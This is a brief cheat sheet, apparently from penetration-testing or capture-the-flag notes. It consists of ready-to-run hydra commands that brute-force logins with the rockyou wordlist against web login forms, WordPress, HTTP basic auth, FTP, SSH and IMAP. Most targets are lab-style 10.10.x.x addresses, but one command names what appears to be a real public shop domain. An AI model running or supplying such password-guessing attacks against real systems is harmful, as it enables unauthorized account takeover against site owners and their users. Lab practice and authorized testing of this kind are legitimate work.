We can for instance use hydra like this

(Note: You can get the parameters used from burp suite response when enumerating)

login-form:
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V -e nsr -f -t 50 -K

hydra -l admin -P /usr/share/wordlists/rockyou.txt blissgadgetstore.com http-post-form "/wp-login.php:log=^USER^&password=^PASS^&wp-submit=Log:Error" -V -e nsr -f -t 50 -K -I  

http-get:
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.54.52 http-get /inferno -V -e nsr -f -t 50 -K

FTP:
hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.204.203 ftp -V -e nsr -f -t 50 -K

SSH:
hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.204.203 ssh -V -e nsr -f -t 50 -K

IMAP:
hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.204.203 imap -V -e nsr -f -t 50 -K


